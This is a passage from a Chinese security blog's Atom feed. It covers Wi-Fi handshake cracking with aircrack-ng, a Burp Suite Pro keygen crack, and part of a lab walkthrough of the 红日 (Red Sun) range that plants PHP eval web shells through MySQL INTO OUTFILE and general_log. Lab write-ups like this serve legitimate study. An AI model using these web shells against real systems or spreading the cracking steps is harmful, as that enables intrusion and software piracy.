+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 进入 tmp 文件夹&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/tmp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查看握手包&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aircrack-ng /tmp/airportSniffG6LoGo.cap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 选择 handshake 不为 0 的 Wi-Fi&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 使用字典爆破&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aircrack-ng -w &lt;span class=&#34;token string&#34;&gt;&#39;字典路径&#39;&lt;/span&gt; -b &lt;span class=&#34;token string&#34;&gt;&#39;Wi-Fi mac地址&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/airportSniffXXXX.cap&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <category term="aircrack-ng" scheme="https://mo-onstudy.com/tags/aircrack-ng/" />
+        <updated>2022-01-19T08:04:44.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://mo-onstudy.com/2022/01/17/Burpsuit%E7%A0%B4%E8%A7%A3/</id>
+        <title>Burpsuit For Mac 破解流程</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2022/01/17/Burpsuit%E7%A0%B4%E8%A7%A3/"/>
+        <content type="html">&lt;h2 id=&#34;前期准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前期准备&#34;&gt;#&lt;/a&gt; 前期准备&lt;/h2&gt;
+&lt;h3 id=&#34;burpsuit下载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#burpsuit下载&#34;&gt;#&lt;/a&gt; Burpsuit 下载&lt;/h3&gt;
+&lt;p&gt;访问&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycA==&#34;&gt; Burpsuit 官网&lt;/span&gt;进入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycC9yZWxlYXNlcy9wcm9mZXNzaW9uYWwtY29tbXVuaXR5LTIwMjEtMTItMT9yZXF1ZXN0ZWRlZGl0aW9uPXByb2Zlc3Npb25hbA==&#34;&gt;下载页面&lt;/span&gt;选择适合版本进行下载并安装&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117163741945.png&#34; alt=&#34;image-20220117163741945&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;破解项目下载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解项目下载&#34;&gt;#&lt;/a&gt; 破解项目下载&lt;/h3&gt;
+&lt;p&gt;访问&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1Ryb2phbkFaaGVu&#34;&gt; TrojanAZhen&lt;/span&gt;/&lt;a href=&#34;https://github.com/TrojanAZhen/BurpSuitePro-2.1&#34;&gt;&lt;strong&gt;BurpSuitePro-2.1&lt;/strong&gt;&lt;/a&gt; 下载项目文档&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117163817508.png&#34; alt=&#34;image-20220117163817508&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;jdk下载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk下载&#34;&gt;#&lt;/a&gt; jdk 下载&lt;/h3&gt;
+&lt;p&gt;从 &lt;span class=&#34;kbd red&#34;&gt;Zulu JDK&lt;/span&gt; 官方网站下载 &lt;span class=&#34;kbd red&#34;&gt;JDK&lt;/span&gt; 安装包并安装 —&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzLz9wYWNrYWdlPWpkaw==&#34;&gt; 下载页面&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117224646677.png&#34; alt=&#34;image-20220117224646677&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;破解步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解步骤&#34;&gt;#&lt;/a&gt; 破解步骤&lt;/h2&gt;
+&lt;p&gt;桌面使用快捷键 &lt;span class=&#34;kbd&#34;&gt;shift&lt;/span&gt; + &lt;span class=&#34;kbd&#34;&gt;command&lt;/span&gt; + &lt;span class=&#34;kbd red&#34;&gt;G&lt;/span&gt;，前往目录 &lt;span class=&#34;kbd red&#34;&gt;/Applications/Burp Suite Professional.app/Contents/java/app/&lt;/span&gt; ，并将破解项目中两个 jar 包 &lt;span class=&#34;kbd red&#34;&gt;burp-loader-x-Ai.jar&lt;/span&gt; 、 &lt;span class=&#34;kbd red&#34;&gt;burp-keygen-scz.jar&lt;/span&gt; 放到目录中&lt;/p&gt;
+&lt;p&gt;在此目录进入终端执行以下命令，执行命令后会打开注册机，同时打开 &lt;span class=&#34;kbd red&#34;&gt;burpsuit&lt;/span&gt; 应用程序，根据以下图示破解&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;java -jar burp-keygen-scz.jar&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117222617370.png&#34; alt=&#34;image-20220117222617370&#34; title=&#34;注册机中可自定义用户名称&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173119941.png&#34; alt=&#34;image-20220117173119941&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173458552.png&#34; alt=&#34;image-20220117173458552&#34; title=&#34;填入注册机中的license&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173556277.png&#34; alt=&#34;image-20220117173556277&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173053218.png&#34; alt=&#34;image-20220117173053218&#34; title=&#34;Copy request至注册机&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173737953.png&#34; alt=&#34;image-20220117173737953&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173813598.png&#34; alt=&#34;image-20220117173813598&#34; title=&#34;从注册中Paste response&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173833200.png&#34; alt=&#34;image-20220117173833200&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220117173844958.png&#34; alt=&#34;image-20220117173844958&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="Burp" scheme="https://mo-onstudy.com/tags/Burp/" />
+        <category term="破解软件" scheme="https://mo-onstudy.com/tags/%E7%A0%B4%E8%A7%A3%E8%BD%AF%E4%BB%B6/" />
+        <updated>2022-01-17T08:17:41.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</id>
+        <title>红日靶场一</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
+        <content type="html">&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
+&lt;h3 id=&#34;修改vmware-fusion网络配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改vmware-fusion网络配置&#34;&gt;#&lt;/a&gt; 修改 VMware Fusion 网络配置&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 修改 VMware Fusion 的网络配置文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;vi&lt;/span&gt; /Library/Preferences/VMware&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt; Fusion/networking&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class=&#34;language-networking&#34;&gt;VERSION=1,0
+answer VNET_1_DHCP no
+answer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591
+answer VNET_1_HOSTONLY_NETMASK 255.255.255.0
+answer VNET_1_HOSTONLY_SUBNET 192.168.52.0
+answer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0
+answer VNET_1_VIRTUAL_ADAPTER yes
+answer VNET_8_DHCP no
+answer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89
+answer VNET_8_HOSTONLY_NETMASK 255.255.255.0
+answer VNET_8_HOSTONLY_SUBNET 192.168.11.0
+answer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803
+answer VNET_8_NAT yes
+answer VNET_8_VIRTUAL_ADAPTER yes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 修改 ip 为 192.168.52.0 网段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;vi&lt;/span&gt; /Library/Preferences/VMware&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt; Fusion/vmware1/nat.conf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 修改网关为 192.168.11.2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;vi&lt;/span&gt; /Library/Preferences/VMware&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt; Fusion/vmware8/nat.conf&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;修改镜像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改镜像&#34;&gt;#&lt;/a&gt; 修改镜像&lt;/h3&gt;
+&lt;h4 id=&#34;win7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win7&#34;&gt;#&lt;/a&gt; win7&lt;/h4&gt;
+&lt;p&gt;win7 需新添加一个网络适配器&lt;/p&gt;
+&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;网络适配器1&#34;&gt;
+&lt;p&gt;vmware 网络适配器 1 选择&lt;span class=&#34;label success&#34;&gt; NAT 模式&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;进入 win7 系统设置对应网络适配器为静态 ip&lt;/p&gt;
+&lt;div class=&#34;note info&#34;&gt;
+&lt;p&gt;可通过断开 / 连接 vmware 网络适配器或网络适配器的 MAC 地址找到对应的网络适配器&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118233359076.png&#34; alt=&#34;image-20220118233359076&#34; /&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;网络适配器2&#34;&gt;
+&lt;p&gt;vmware 网络适配器 2 选择&lt;span class=&#34;label success&#34;&gt;仅主机模式&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;进入 win7 系统设置对应网络适配器为静态 ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118233313039.png&#34; alt=&#34;image-20220118233313039&#34; /&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class=&#34;tab&#34; data-id=&#34;id1&#34; data-title=&#34;修改Hosts文件&#34;&gt;
+&lt;pre&gt;&lt;code class=&#34;language-hosts&#34;&gt;# 添加域名解析
+192.168.52.138 owa.god.org
+192.168.52.141 root-tvi862ubeh.god.org
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220118235247824.png&#34; alt=&#34;image-20220118235247824&#34; /&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;打开 C 盘 PHPStudy 并开启&lt;/p&gt;
+&lt;h3 id=&#34;win-server-2003&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win-server-2003&#34;&gt;#&lt;/a&gt; win server 2003&lt;/h3&gt;
+&lt;p&gt;网络适配器选择&lt;span class=&#34;label success&#34;&gt;仅主机模式&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;win-server-2008&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#win-server-2008&#34;&gt;#&lt;/a&gt; win server 2008&lt;/h3&gt;
+&lt;p&gt;网络适配器选择&lt;span class=&#34;label success&#34;&gt;仅主机模式&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;环境介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境介绍&#34;&gt;#&lt;/a&gt; 环境介绍&lt;/h2&gt;
+&lt;p&gt;攻击机：macOS&lt;/p&gt;
+&lt;p&gt;攻击机 IP：192.168.50.171&lt;/p&gt;
+&lt;p&gt;目标机：win7&lt;/p&gt;
+&lt;p&gt;目标机 IP：192.168.11.123&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;角色&lt;/th&gt;
+&lt;th&gt;系统&lt;/th&gt;
+&lt;th&gt;IP&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;攻击机&lt;/td&gt;
+&lt;td&gt;macos&lt;/td&gt;
+&lt;td&gt;192.168.50.171（en1）、192.168.50.23（en0）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;目标机&lt;/td&gt;
+&lt;td&gt;win7&lt;/td&gt;
+&lt;td&gt;192.168.11.123（外网）、192.168.52.143（内网）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;域内机&lt;/td&gt;
+&lt;td&gt;Win2003&lt;/td&gt;
+&lt;td&gt;192.168.52.141（内网）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;域控&lt;/td&gt;
+&lt;td&gt;Win2008&lt;/td&gt;
+&lt;td&gt;192.168.52.138（内网）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h2&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python3 dirmap.py -i http://192.168.11.123&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427162656117.png&#34; alt=&#34;image-20220427162656117&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;备份文件下载&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMTEuMTIzL2JlaWZlbi5yYXIlRUYlQkMlOENjb25maWcucGhwJUU0JUI4JUFEJUU2JTlGJUE1JUU3JTlDJThCJUU2JTk1JUIwJUU2JThEJUFFJUU1JUJBJTkzJUU4JUI0JUE2JUU1JThGJUI3JUU1JUFGJTg2JUU3JUEwJTgxJUU0JUI4JUJBcm9vdC9yb290&#34;&gt;http://192.168.11.123/beifen.rar，config.php 中查看数据库账号密码为 root/root&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427162814019.png&#34; alt=&#34;image-20220427162814019&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getshell&#34;&gt;#&lt;/a&gt; getshell&lt;/h2&gt;
+&lt;h3 id=&#34;phpmyadmin&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpmyadmin&#34;&gt;#&lt;/a&gt; phpmyadmin&lt;/h3&gt;
+&lt;p&gt;phpmyadmin 登录账号密码：root/root&lt;/p&gt;
+&lt;p&gt;执行命令允许攻击机远程连接数据库&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 允许远程连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;GRANT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PRIVILEGES&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TO&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@&#39;%&#39;&lt;/span&gt; IDENTIFIED &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WITH&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;GRANT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPTION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 刷新权限&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flush &lt;span class=&#34;token keyword&#34;&gt;privileges&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可使用第三方软件连接数据库&lt;/p&gt;
+&lt;p&gt;查询到账号密码，密码 md5 解密，为 admin/123456&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427163209495.png&#34; alt=&#34;image-20220427163209495&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427164622214.png&#34; alt=&#34;image-20220427164622214&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;into-outfile-getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#into-outfile-getshell&#34;&gt;#&lt;/a&gt; into outfile getshell&lt;/h4&gt;
+&lt;p&gt;利用条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;对 web 目录需要有写权限能够使用单引号&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;知道绝对路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;secure_file_priv 没有具体值&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; variables &lt;span class=&#34;token operator&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%secure%&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427165323478.png&#34; alt=&#34;image-20220427165323478&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;secure_file_priv 的值为 NULL，说明不能使用 into outfile 的方式写入 shell&lt;/p&gt;
+&lt;p&gt;secure_file_priv 的值为空时，写入 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查询物理路径&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@basedir&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 写入 shell&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php eval($_POST[cmd]);?&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:/phpStudy/www/111.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;日志getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志getshell&#34;&gt;#&lt;/a&gt; 日志 getshell&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;# 开启日志记录
+set global general_log = &amp;quot;ON&amp;quot;;
+# 查看当前日志存放目录
+show variables like &#39;general%&#39;;
+# 指定日志记录文件
+set global general_log_file = &amp;quot;C:/phpStudy/WWW/shelllog.php&amp;quot;;
+# 执行命令
+SELECT&#39;&amp;lt;?php eval(@$_POST[&#39;123&#39;]);?&amp;gt;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427170930272.png&#34; alt=&#34;image-20220427170930272&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427170947575.png&#34; alt=&#34;image-20220427170947575&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171016485.png&#34; alt=&#34;image-20220427171016485&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20220427171037444.png&#34; alt=&#34;image-20220427171037444&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;yxcms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yxcms&#34;&gt;#&lt;/a&gt; yxcms&lt;/h3&gt;
+&lt;p&gt;后台登陆地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMTEuMTIzL3l4Y21zP3I9YWRtaW4=&#34;&gt;http://192.168.11.123/yxcms?r=admin&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;后台登录账号密码：admin/123456&lt;/p&gt;
+&lt;p&gt;前台模板，写入木马文件&lt;/p&gt;
